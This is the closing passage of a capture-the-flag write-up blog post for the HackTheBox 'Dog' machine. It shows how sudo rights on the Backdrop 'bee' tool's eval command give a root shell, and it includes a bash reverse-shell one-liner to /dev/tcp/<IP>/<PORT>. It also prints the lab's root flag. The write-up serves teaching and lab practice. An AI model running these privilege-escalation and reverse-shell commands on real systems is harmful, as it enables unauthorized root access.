</span></span></span><span class="line"><span class="cl"><span class="sd"> *   Error message to output to the user.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $filename
</span></span></span><span class="line"><span class="cl"><span class="sd"> *   The file that the error came from.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param int $line
</span></span></span><span class="line"><span class="cl"><span class="sd"> *   The line number the error came from.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param array $context
</span></span></span><span class="line"><span class="cl"><span class="sd"> *   An array of all variables from where the error was triggered.
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @see https://www.php.net/manual/en/function.set-error-handler.php
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @see _backdrop_error_handler()
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">bee_error_handler</span><span class="p">(</span><span class="nv">$error_level</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$context</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/errors.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">_bee_error_handler_real</span><span class="p">(</span><span class="nv">$error_level</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="nv">$context</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Detects whether the current script is running in a command-line environment.
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">bee_is_cli</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">php_sapi_name</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;cli&#39;</span> <span class="o">||</span> <span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argc&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argc&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Return the HTML to display if this page is loaded in the browser.
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @return string
</span></span></span><span class="line"><span class="cl"><span class="sd"> *   The concatentated html to display.
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">bee_browser_load_html</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Set the title to use in h1 and title elements.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$title</span> <span class="o">=</span> <span class="s2">&#34;Bee Gone!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Place a white block over &#34;#!/usr/bin/env php&#34; as this is output before
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// anything else.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$browser_output</span> <span class="o">=</span> <span class="s2">&#34;&lt;div style=&#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;&#39;&gt;&amp;nbsp;&lt;/div&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Add the bee logo and style appropriately.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$browser_output</span> <span class="o">.=</span> <span class="s2">&#34;&lt;img src=&#39;./images/bee.png&#39; align=&#39;right&#39; width=&#39;150&#39; height=&#39;157&#39; style=&#39;max-width:100%;margin-top:3rem;&#39;&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Add meaningful text.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$browser_output</span> <span class="o">.=</span> <span class="s2">&#34;&lt;h1 style=&#39;font-family:Tahoma;&#39;&gt;</span><span class="si">$title</span><span class="s2">&lt;/h1&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$browser_output</span> <span class="o">.=</span> <span class="s2">&#34;&lt;p style=&#39;font-family:Verdana;&#39;&gt;Bee is a command line tool only and will not work in the browser.&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Add the document title using javascript when the window loads.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$browser_output</span> <span class="o">.=</span> <span class="s2">&#34;&lt;script&gt;window.onload = function(){document.title=&#39;</span><span class="si">$title</span><span class="s2">&#39;;}&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Output the combined string.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nv">$browser_output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We check the <code>bee</code> command&rsquo;s <code>eval</code> functionality.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> sudo bee help eval
eval, ev, php-eval
Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

Arguments:
 code
 The PHP code to evaluate.

Examples:
 bee eval <span class="string">'$node = node_load(1); print $node->title;'</span>
 Loads node with nid 1 and then prints its title.

 bee eval <span class="string">"node_access_rebuild();"</span>
 Rebuild node access permissions.

 bee eval <span class="string">"file_unmanaged_copy('$HOME/Pictures/image.jpg', <span class="string">'public://image.jpg'</span>);"</span>
 Copies a file whose path is determined by an environment's variable. Note the use of double quotes so the variable $HOME gets replaced by its value.

</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>The <code>bee</code> command has an <code>eval</code> subcommand that allows us to execute arbitrary PHP code. To use it correctly, we need to specify the <code>--root</code> parameter pointing to the web root (<code>/var/www/html</code>). We can use this to spawn a root shell.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> sudo /usr/local/bin/bee <span class="flag">--root</span>=/var/www/html eval <span class="string">"system('/bin/bash <span class="</span>flag">-i</span>');"

<span style="color: white">root@dog:/var/www/html#</sapn>
</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>Or, if you need a reverse shell back to your machine (replace <code>&lt;ATTACKER_IP&gt;</code> and <code>&lt;PORT&gt;</code>):
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> sudo /usr/local/bin/bee <span class="flag">--root</span>=/var/www/html eval \
  <span class="string">"system('bash <span class="</span>flag">-i</span> >& /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&1');"
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>Get the <code>root.txt</code>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

root@dog:/var/www/html# cat /root/root.txt
83970a2d7e6797bf5f32b7a915dad3f7
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<blockquote>
<p>Root flag: 83970a2d7e6797bf5f32b7a915dad3f7</p></blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
      <li><a href="http://localhost:1313/tags/backdrop-cms/">Backdrop CMS</a></li>
      <li><a href="http://localhost:1313/tags/web-exploitation/">Web Exploitation</a></li>
      <li><a href="http://localhost:1313/tags/git-exposure/">Git Exposure</a></li>
      <li><a href="http://localhost:1313/tags/remote-code-execution/">Remote Code Execution</a></li>
      <li><a href="http://localhost:1313/tags/privilege-escalation/">Privilege-Escalation</a></li>
      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
      <li><a href="http://localhost:1313/tags/php-exploitation/">PHP Exploitation</a></li>
      <li><a href="http://localhost:1313/tags/information-disclosure/">Information Disclosure</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/posts/htb/linux/medium/hackthebox-cat-writeup/">
    <span class="title">« Prev</span>
    <br>
    <span>HackTheBox - Cat Writeup</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">0xblivion.dev</a></span>

</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
